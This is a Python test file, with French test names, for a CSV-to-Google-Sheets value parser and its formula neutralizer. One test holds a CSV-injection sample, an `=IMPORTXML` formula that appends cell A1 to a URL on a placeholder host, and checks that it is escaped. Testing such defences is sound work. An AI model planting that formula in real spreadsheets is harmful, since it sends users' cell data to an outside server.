"""`values_from_csv`: a CSV text typed for a USER_ENTERED write."""

from oto.tools.google.sheets.lib.sheets_client import neutralize_formula, values_from_csv


def test_les_nombres_partent_en_nombres():
    assert values_from_csv("a,b,c\n42,-150.5,0.25\n") == [["a", "b", "c"], [42, -150.5, 0.25]]


def test_ce_qui_n_est_pas_strictement_un_nombre_reste_du_texte():
    assert values_from_csv("1e5,1 000,12,5,+3,06400,0,.5,5.\n") == [
        ["1e5", "1 000", 12, 5, "'+3", "06400", 0, ".5", "5."]]


def test_l_apostrophe_garde_le_texte_tel_quel():
    assert values_from_csv("'1234567890123456,'-5\n") == [["'1234567890123456", "'-5"]]


def test_une_date_reste_du_texte():
    assert values_from_csv("01/03/2024,2024-03-01\n") == [["01/03/2024", "2024-03-01"]]


def test_un_champ_entre_guillemets_porte_virgule_et_retour_a_la_ligne():
    text = 'id,"Montant\nrestant dû","Nom, prénom"\n7,"1 200,50","Doe, ""Jane"""\n'
    assert values_from_csv(text) == [
        ["id", "Montant\nrestant dû", "Nom, prénom"],
        [7, "1 200,50", 'Doe, "Jane"'],
    ]


def test_le_bom_utf8_est_retire():
    assert values_from_csv("\ufeffid,nom\n1,é\n") == [["id", "nom"], [1, "é"]]


def test_les_lignes_de_longueurs_inegales_passent_telles_quelles():
    assert values_from_csv("a,b,c\n1\n2,3\n") == [["a", "b", "c"], [1], [2, 3]]


def test_une_colonne_sans_en_tete_et_une_ligne_vide():
    assert values_from_csv("12.5\n\n-3\n") == [[12.5], [-3]]


def test_un_csv_vide():
    assert values_from_csv("") == []


def test_une_colonne_sans_en_tete_ou_une_cellule_vide_s_ecrit_entre_guillemets():
    """Une cellule vide d'une colonne unique s'écrit `""` : elle reste une ligne, en
    chaîne vide — ni nombre, ni None — pour rester alignée sur l'ordre des ids."""
    assert values_from_csv('-150.5\n""\n12\n') == [[-150.5], [""], [12]]


def test_un_export_large_avec_en_tetes_sur_deux_lignes():
    en_tetes = ['"Colonne\n%d"' % i if i % 5 == 0 else "col%d" % i for i in range(35)]
    ligne = ["'%016d" % 1234567890123456, "-150.5", "01/03/2024"] + ["x"] * 32
    rows = values_from_csv(",".join(en_tetes) + "\n" + ",".join(ligne) + "\n")
    assert len(rows) == 2 and len(rows[0]) == 35 and len(rows[1]) == 35
    assert rows[0][0] == "Colonne\n0" and rows[0][1] == "col1"
    assert rows[1][:3] == ["'1234567890123456", -150.5, "01/03/2024"]


def test_une_formule_est_neutralisee():
    rows = values_from_csv('"=IMPORTXML(""https://x/?""&A1,""//a"")",@SUM(A1),-moins,"\tx",+33 6\n')
    assert rows == [["'=IMPORTXML(\"https://x/?\"&A1,\"//a\")", "'@SUM(A1)", "'-moins",
                     "'\tx", "'+33 6"]]


def test_un_nombre_negatif_reste_un_nombre_et_l_apostrophe_reste_telle_quelle():
    assert values_from_csv("-150.5,'=garde\n") == [[-150.5, "'=garde"]]


def test_les_formules_ne_passent_que_sur_option():
    assert values_from_csv("=A1+1,-150.5\n", formulas=True) == [["=A1+1", -150.5]]


def test_neutralize_formula():
    assert neutralize_formula("=1") == "'=1" and neutralize_formula("x") == "x"
